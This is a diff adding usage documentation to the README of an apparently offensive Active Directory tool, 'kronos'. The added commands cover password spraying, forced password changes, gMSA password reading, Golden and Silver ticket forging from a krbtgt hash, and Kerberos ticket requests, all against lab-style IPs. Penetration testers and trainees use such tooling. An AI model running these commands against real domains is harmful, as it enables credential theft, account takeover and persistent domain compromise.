@@ -91,4 +91,41 @@ kronos help
     kronos kerbroast 10.10.10.10 -u 'admin' -p 'Secret123!'
     ```
 
-*(Run `kronos <command> --help` for specific options available to each command.)*
+*   **`spray`**: Password spray against a target using `nxc smb`.
+    ```bash
+    # Uses valid_users.txt (created automatically by userenum)
+    kronos spray 10.10.10.10 -p 'Spring2024!'
+    ```
+
+*   **`forcechange`**: Force change a user's password using `bloodyAD`.
+    ```bash
+    kronos forcechange 10.10.10.10 -t 'p.user' -P 'P@ssw0rd99!Complex'
+    ```
+
+*   **`gmsa`**: Read GMSA passwords using `nxc ldap`.
+    ```bash
+    kronos gmsa 10.10.10.10
+    ```
+
+*   **`ticket`**: Create Golden and Silver tickets using `impacket-ticketer`.
+    ```bash
+    kronos ticket -d 'silverlining.eusec' -S 'S-1-5-21-...' -H 'krbtgt_hash'
+    ```
+
+*   **`convert`**: Convert tickets between `.kirbi` and `.ccache` formats using `impacket-ticketConverter`.
+    ```bash
+    kronos convert -i ticket.kirbi -o ticket.ccache
+    ```
+
+*   **`request`**: Request a TGT or ST using `impacket-getTGT` or `impacket-getST`. It automatically exports the `KRB5CCNAME` variable for subsequent Kerberos authentication!
+    ```bash
+    kronos request -t 10.10.10.10
+    ```
+
+### Kerberos Authentication
+Most commands now support the `-k` or `--kerberos` flag. When you have a valid ticket exported to `KRB5CCNAME` (either manually or via the `request` command), you can pass `-k` to authenticate using Kerberos instead of cleartext credentials or hashes.
+    ```bash
+    kronos dominfo 10.10.10.10 -k
+    kronos ingest 10.10.10.10 -k
+    kronos gmsa 10.10.10.10 -k
+    ```
